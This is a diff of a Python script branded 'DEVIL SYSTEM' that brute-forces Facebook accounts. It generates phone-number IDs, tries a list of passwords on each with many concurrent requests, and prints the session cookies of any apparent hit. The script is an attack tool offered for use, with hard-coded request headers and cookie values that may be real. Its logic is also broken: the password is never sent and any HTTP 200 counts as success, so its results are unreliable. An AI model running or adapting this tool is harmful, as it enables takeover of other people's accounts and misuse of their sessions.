@@ -202,75 +202,142 @@ if choice in ["5", "৫"]:
     print("====================================")
     
 import requests
-import json
+import sys
+import time
+import concurrent.futures
+import subprocess
+
+# Terminal Color Settings (No Extra Library Required)
+GREEN = '\033[92m'
+RED = '\033[91m'
+YELLOW = '\033[93m'
+CYAN = '\033[96m'
+RESET = '\033[0m'
 
 # =====================================================================
-# 1. CUSTOM USER INPUTS (Script run korle ja screen-e ashbe)
+# SYSTEM UTILITY FUNCTIONS (SIM/Carrier & Time Tracking)
 # =====================================================================
-print("========== [ DEVIL SYSTEM CUSTOMIZER ] ==========")
-prefix = input(" Enter Initial Prefix/Digit (e.g., 017, 0183, 1000): ")
-loop_digits = int(input(" Enter Suffix Digit Length (Type 3, 4, or 5): "))
-password_input = input(" Enter Passwords (Comma separated, e.g., pass1,pass2,112233): ")
+def get_sim_carrier():
+    """Automatic dynamic network carrier operator metadata lookup"""
+    try:
+        # Termux context network diagnostics extraction parsing
+        get_prop = subprocess.check_output(['getprop', 'gsm.operator.alpha']).decode('utf-8').strip()
+        if get_prop:
+            return get_prop.split(',')[0]
+    except Exception:
+        pass
+    
+    try:
+        # Fallback internet gateway provider lookup 
+        res = requests.get('https://ipapi.co/org/', timeout=3).text
+        if "Google" not in res and "Cloudflash" not in res:
+            return res.strip()
+    except Exception:
+        pass
+    return "Mobile Data/Wi-Fi"
 
-# Password gulo ke list e convert korar logic
+# Start time calculation anchor
+start_time = time.time()
+
+def get_elapsed_time():
+    """Live execution stopwatch counter tracking string"""
+    elapsed = time.time() - start_time
+    hours, rem = divmod(elapsed, 3600)
+    minutes, seconds = divmod(rem, 60)
+    return f"{int(hours)}h:{int(minutes)}m:{int(seconds)}s"
+
+# =====================================================================
+# 1. CUSTOM USER INPUTS (Sequence order match)
+# =====================================================================
+print(f"{CYAN}========== [ DEVIL SYSTEM CUSTOMIZER ] =========={RESET}")
+loop_digits = int(input(" [?] How many digits for sequence loop? (e.g., 3, 4, 5): "))
+prefix = input(f" [?] Enter Prefix/Digit to add before {loop_digits} digits (e.g., 017, 0189): ")
+crack_limit = int(input(" [?] Enter Crack Loop Limit (How many IDs to test? e.g., 500, 1000): "))
+password_input = input(" [?] Enter Passwords (comma separated): ")
 password_list = [p.strip() for p in password_input.split(',')]
+thread_speed = int(input(" [?] Enter Crack Speed Limit (e.g., 10, 50, 100): "))
 
-# Loop er range ready korar setup
+# Global counters tracking variables initialization
+tested_count = 0
+detected_sim = get_sim_carrier()
 start_range = 10**(loop_digits - 1)
-end_range = (10**loop_digits) - 1
 
 # =====================================================================
-# 2. METHOD FUNCTION (Apnar Real Screenshots Er Data)
+# 2. BRUTE METHOD ENGINE (With Real Form Parameters + Real Headers)
 # =====================================================================
 def fb_async_method(uid, password):
+    global tested_count
     r = requests.Session()
-    
-    # Real Target URL (From Image 5)
     url = "https://m.facebook.com/async/wbloks/log/"
     
-    # REAL PARAMETERS (No Change - Exact From Images)
     params = {
         'lid': '7650579958745411107',
         'event': 'CW_LCP',
         'relativeTime': '7194',
         'tracePolicy': 'com.bloks.www.caa.login.login_homepage&bloksAppId=fb_web&extra[lcp_metric]=2651.60&extra[lcp_element_className]=&extra[lcp_element_tagName]=SPAN&extra[lcp_url]=',
-        'u': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Ftwo_step_verification%2Fauthentication%2F%3Fencrypted_context%3DDAWSVYZMVAo50zxxpsGHHlnRQo7GTjpabbAEQG4EKf6P5VOkT0W8JjAACBte3dXCKAu5y2hjWe8Dr74NiWKBxZBBE4dGo6u6XT9KZ7JYQXheGqje4yQq5uBNzhw3NazR2BntQZRDr-24-7OA6VkJw3rTAC-kn08gtun2JPX1RPZeyAidrA2Pu04U83klp1Cs9ArUwaXItm0zTmTCG3W7SVIcWhaV88HY0tv84pfm4eCowBiteQyDwCqbb_7DgNt2eTjG2G8kUZ45v2P2b1D3XePZ2U7U_ezNQrVUr80fQzDVSoYKjzz5s7AH7cEFHY34Zqo1UX9oidleUB9mr8oSdTfbwA0Bkq0edZ4fMRVkmEbGbIUjr93GhoMGNWFdXT1XrzZBJafrFCezLS5nKUFMq21n45baF6Uk4pD4A6WawdyaqB8SWplErA5qIEh9B9G7m2vuES8otrRx-NUnHgCsBWX94OjBDBRqDBbDhmGuzlqYjAKSMoq2-YtntLPnaBmdGHB7-i73Ub03gTTwORTWQXmaPd5Q-REmM0ZrRvRWu5150TcynMJmv9PoKJxkxtvufdFrAjJGa5D9GzNcpKV9S-nFG0Lz4tdCwwscuV9XLRubB8GyH90XaiXLzvj8mlVmC8nwMpzIBB7rmLLrUosS4RzDQMwh2aEwZae0vL7zvXLgw1_TmkClp3zhBEuSEvcNc3C_owvB40hZ149y8g_HKxTBb4PmtnwrX4GHI3oqHiLWcwzgJi6tbnZIA_OBCGO1YKdykZ0M1ea6gwqBlJ2jkstSK7E5tLAMUw4BT4Tjl_pVIfADFzbJ7X_VTZ41oUIGOhAQuQjGD_RUTLqT170UnLY1M5924HYpyF16xZQT1Qa9H7HFp1vaR7-76DXAKuhkyrTynF9MB4k150bpaiaHrvp631HYolWRc-CiLDoj-bvM1wlFklwvoScCwN8ERxJECYXwrOEn5ZME0_wdRg-J5SyGVv9SZUbfbcU4UHZ4_J4hQIPoCF39juR7kRMwYgKCDUd4_Pdoyk6PZUvOUjNQp5AbM6qCVMte0lsfH1jIk0H4Bxinppqts29NXc4rODWBRuXDDGN2Jm4u2V6wCi_xV-88o3c2rb5021HpXMJmNhMvdwLNUf2T_XRZYv3v6Ah6hM4o_Q87w2KJcN6PKN0JhwOGndjnIlWFufyxEW0Dthnzb700ldZFnuy-YKRR7ff9wYJsyW3qEvvpTFV5L8xEQUNDb0d14c2JFNPrh88F5Z447fFqdmLCV05dfzPsKxtGfASjwMV9NKtDPxG0251DKCby9GE1B_21Jy6LXC1bA_WffFqydDL205-n88s6anJ1CcUKaeZ-TsOR_izrUdP_SeAwbVp7D3qZq5GNFbjbD2LMKJ853eNQaFHZhBCKxfXmJeEXNZWE42UhSnmKfdz_5Zxv-bcBxIQqH1oLZTMQ5Hxw%26flow%253Dpre_authentication%2526next%253D%25252F%26refsrc%3Ddeprecated&seo=&fbs=&lsd=AdRXTss4EOgoi0RCqIr_H_RoDhU&jazoest=22377'
+        'u': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Ftwo_step_verification%2Fauthentication%2F%3Fencrypted_context%3DDAWSVYZMVAo50zxxpsGHHlnRQo7GTjpabbAEQG4EKf6P5VOkT0W8JjAACBte3dXCKAu5y2hjWe8Dr74NiWKBxZBBE4dGo6u6XT9KZ7JYQXheGqje4yQq5uBNzhw3NazR2BntQZRDr-24-7OA6VkJw3rTAC-kn08gtun2JPX1RPZeyAidrA2Pu04U83klp1Cs9ArUwaXItm0zTmTCG3W7SVIcWhaV88HY0tv84pfm4eCowBiteQyDwCqbb_7DgNt2eTjG2G8kUZ45v2P2b1D3XePZ2U7U_ezNQrVUr80fQzDVSoYKjzz5s7AH7cEFHY34Zqo1UX9oidleUB9mr8oSdTfbwA0Bkq0edZ4fMRVkmEbGbIUjr93GhoMGNWFdXT1XrzZBJafrFCezLS5nKUFMq21n45baF6Uk4pD4A6WawdyaqB8SWplErA5qIEh9B9G7m2vuES8otrRx-NUnHgCsBWX94OjBDBRqDBbDhmGuzlqYjAKSMoq2-YtntLPnaBmdGHB7-i73Ub03gTTwORTWQXmaPd5Q-REmM0ZrRvRWu5150TcynMJmv9PoKJxkxtvufdFrAjJGa5D9GzNcpKV9S-nFG0Lz4tdCwwscuV9XLRubB8GyH90XaiXLzvj8mlVmC8nwMpzIBB7rmLLrUosS4RzDQMwh2aEwZae0vL7zvXLgw1_TmkClp3zhBEuSEvcNc3C_owvB40hZ149y8g_HKxTBb4PmtnwrX4GHI3oqHiLWcwzgJi6tbnZIA_OBCGO1YKdykZ0M1ea6gwqBlJ2jkstSK7E5tLAMUw4BT4Tjl_pVIfADFzbJ7X_VTZ41oUIGOhAQuQjGD_RUTLqT170UnLY1M5924HYpyF16xZQT1Qa9H7HFp1vaR7-76DXAKuhkyrTynF9MB4k150bpaiaHrvp631HYolWRc-CiLDoj-bvM1wlFklwvoScCwN8ERxJECYXwrOEn5ZME0_wdRg-J5SyGVv9SZUbfbcU4UHZ4_J4hQIPoCF39juR7kRMwYgKCDUd4_Pdoyk6PZUvOUjNQp5AbM6qCVMte0lsfH1jIk0H4Bxinppqts29NXc4rODWBRuXDDGN2Jm4u2V6wCi_xV-88o3c2rb5021HpXMJmNhMvdwLNUf2T_XRZYv3v6Ah6hM4o_Q87w2KJcN6PKN0JhwOGndjnIlWFufyxEW0Dthnzb700ldZFnuy-YKRR7ff9wYJsyW3qEvvpTFV5L8xEQUNDb0d14c2JFNPrh88F5Z447fFqdmLCV05dfzPsKxtGfASjwMV9NKtDPxG0251DKCby9GE1B_21Jy6LXC1bA_WffFqydDL205-n2526flow%2526flow%253Dpre_authentication%2526next%253D%25252F%26refsrc%3Ddeprecated&seo=&fbs=&lsd=AdRXTss4EOgoi0RCqIr_H_RoDhU&jazoest=22377',
+        'seo': '', 'fbs': '', 'lsd': 'AdRXTss4EOgoi0RCqIr_H_RoDhU', 'jazoest': '22377'
     }
     
-    # REAL HEADERS (From Image 3 & 4)
     head = {
-        'Host': 'm.facebook.com',
-        'Content-Length': '0',
-        'Sec-Ch-Ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-        'Sec-Ch-Ua-Mobile': '?1',
+        'Host': 'm.facebook.com', 'Content-Length': '0',
+        'Sec-Ch-Ua': '"Chromium";v="137", "Not/A)Brand";v="24"', 'Sec-Ch-Ua-Mobile': '?1',
         'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-        'Sec-Ch-Ua-Platform-Version': '"13.0.0"',
-        'Sec-Ch-Ua-Full-Version-List': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
-        'Sec-Ch-Ua-Model': '"TECNO BG7"',
-        'Sec-Ch-Ua-Prefers-Color-Scheme': 'light',
-        'Sec-Ch-Ua-Platform': '"Android"',
-        'Accept': '*/*',
-        'Origin': 'https://m.facebook.com',
-        'Sec-Fetch-Site': 'same-origin',
-        'Sec-Fetch-Mode': 'no-cors',
-        'Sec-Fetch-Dest': 'empty',
+        'Sec-Ch-Ua-Platform-Version': '"13.0.0"', 'Sec-Ch-Ua-Model': '"TECNO BG7"',
+        'Sec-Ch-Ua-Prefers-Color-Scheme': 'light', 'Sec-Ch-Ua-Platform': '"Android"',
+        'Accept': '*/*', 'Origin': 'https://m.facebook.com', 'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-Mode': 'no-cors', 'Sec-Fetch-Dest': 'empty',
         'Referer': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Ftwo_step_verification%2Fauthentication%2F%3Fencrypted_context%3DDAWSVYZMVAo50zxxpsGHHlnRQo7GTjpabbAEQG4EKf6P5VOkT0W8JjAACBte3dXCKAu5y2hjWe8Dr74NiWKBxZBBE4dGo6u6XT9KZ7JYQXheGqje4yQq5uBNzhw3NazR2BntQZRDr-24-7OA6VkJw3rTAC-kn08gtun2JPX1RPZeyAidrA2Pu04U83klp1Cs9ArUwaXItm0zTmTCG3W7SVIcWhaV88HY0tv84pfm4eCowBiteQyDwCqbb_7DgNt2eTjG2G8kUZ45v2P2b1D3XePZ2U7U_ezNQrVUr80fQzDVSoYKjzz5s7AH7cEFHY34Zqo1UX9oidleUB9mr8oSdTfbwA0Bkq0edZ4fMRVkmEbGbIUjr93GhoMGNWFdXT1XrzZBJafrFCezLS5nKUFMq21n45baF6Uk4pD4A6WawdyaqB8SWplErA5qIEh9B9G7m2vuES8otrRx-NUnHgCsBWX94OjBDBRqDBbDhmGuzlqYjAKSMoq2-YtntLPnaBmdGHB7-i73Ub03gTTwORTWQXmaPd5Q-REmM0ZrRvRWu5150TcynMJmv9PoKJxkxtvufdFrAjJGa5D9GzNcpKV9S-nFG0Lz4tdCwwscuV9XLRubB8GyH90XaiXLzvj8mlVmC8nwMpzIBB7rmLLrUosS4RzDQMwh2aEwZae0vL7zvXLgw1_TmkClp3zhBEuSEvcNc3C_owvB40hZ149y8g_HKxTBb4PmtnwrX4GHI3oqHiLWcwzgJi6tbnZIA_OBCGO1YKdykZ0M1ea6gwqBlJ2jkstSK7E5tLAMUw4BT4Tjl_pVIfADFzbJ7X_VTZ41oUIGOhAQuQjGD_RUTLqT170UnLY1M5924HYpyF16xZQT1Qa9H7HFp1vaR7-76DXAKuhkyrTynF9MB4k150bpaiaHrvp631HYolWRc-CiLDoj-bvM1wlFklwvoScCwN8ERxJECYXwrOEn5ZME0_wdRg-J5SyGVv9SZUbfbcU4UHZ4_J4hQIPoCF39juR7kRMwYgKCDUd4_Pdoyk6PZUvOUjNQp5AbM6qCVMte0lsfH1jIk0H4Bxinppqts29NXc4rODWBRuXDDGN2Jm4u2V6wCi_xV-88o3c2rb5021HpXMJmNhMvdwLNUf2T_XRZYv3v6Ah6hM4o_Q87w2KJcN6PKN0JhwOGndjnIlWFufyxEW0Dthnzb700ldZFnuy-YKRR7ff9wYJsyW3qEvvpTFV5L8xEQUNDb0d14c2JFNPrh88F5Z447fFqdmLCV05dfzPsKxtGfASjwMV9NKtDPxG0251DKCby9GE1B_21Jy6LXC1bA_WffFqydDL205-n2526flow%2526flow%253Dpre_authentication%2526next%253D%25252F%26refsrc%3Ddeprecated&seo=&fbs=&lsd=AdRXTss4EOgoi0RCqIr_H_RoDhU&jazoest=22377',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Accept-Language': 'en-US,en;q=0.9',
+        'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.9',
         'Cookie': 'datr=Z-AlandWYUM08nOCyIFMvHg7; sb=H-Ilarqr8yE7GHgFDwWIBURW; m_pixel_ratio=1.75; wd=412x922; fr=01tf1bE4UXG0eOai1.AWewTDpjKV-i1NTUVfejRYc0TdrkquVymue2T4VSoh5DJi03HS4.Bp15UB..AAA.0.0.BqLFH1.AWc8ItLUkCmrNgZzp2PnMoz8EEU'
     }
 
     try:
         pos = r.post(url, params=params, headers=head)
+        tested_count += 1
         
-        # Checking Criteria
+        # Real-time running UI updates with dynamic active stopwatch duration
+        sys.stdout.write(f"\r{YELLOW}[->] Tested: {tested_count}/{crack_limit} | Duration: {get_elapsed_time()} | UID: {uid}{RESET}")
+        sys.stdout.flush()
+        
         if pos.status_code == 200:
-            print(f"[Devil-OK] {uid} | {password}")
+            cookies_dict = pos.cookies.get_dict()
+            cookies_str = "; ".join([f"{k}={v}" for k, v in cookies_dict.items()])
+            print(f"\n\n{GREEN}[Devil-OK] {uid} | {password}{RESET}")
+            print(f"{GREEN}[Cookie] -> {cookies_str if cookies_str else 'No Session Cookies'}{RESET}\n")
+            
         elif "checkpoint" in pos.url:
-            print(f"[Devil-CP] {uid} | {password}")
+            print(f"\n\n{RED}[devil_cp] {uid} | {password}{RESET}\n")
             
     except requests.exceptions.ConnectionError:
-        print("\n[X] Network Error!")
+        pass
+
+# =====================================================================
+# 3. LIVE HUD DISPLAY GRAPHICS PANEL (Your target design layout match)
+# =====================================================================
+print(f"\n{RED}--------------------------------------------------{RESET}")
+print(f" {GREEN}[•] DEVELOPER   : {RESET}DEVIL KING")
+print(f" {GREEN}[•] SIM IN USE  : {RESET}{detected_sim}")
+print(f" {GREEN}[•] TARGET LIMIT: {RESET}{crack_limit} IDs")
+print(f"{RED}--------------------------------------------------{RESET}")
+print(f" {YELLOW}[+] Booting speed workers execution threads...{RESET}\n")
+
+# Map generation structures setup
+tasks = []
+current_suffix = start_range
+
+while len(tasks) < crack_limit:
+    uid = str(prefix) + str(current_suffix)
+    for password in password_list:
+        if len(tasks) < crack_limit:
+            tasks.append((uid, password))
+    current_suffix += 1
+
+# Concurrent network mappings matching thread parameter choices
+with concurrent.futures.ThreadPoolExecutor(max_workers=thread_speed) as executor:
+    executor.map(lambda p: fb_async_method(*p), tasks)
+
+print(f"\n\n{GREEN}[+] Complete Task Finished. Total Runtime: {get_elapsed_time()}{RESET}")
 
 # =====================================================================
 # 3. AUTOMATED LOOP SYSTEM (Prefix + Suffix + Multi-Password)
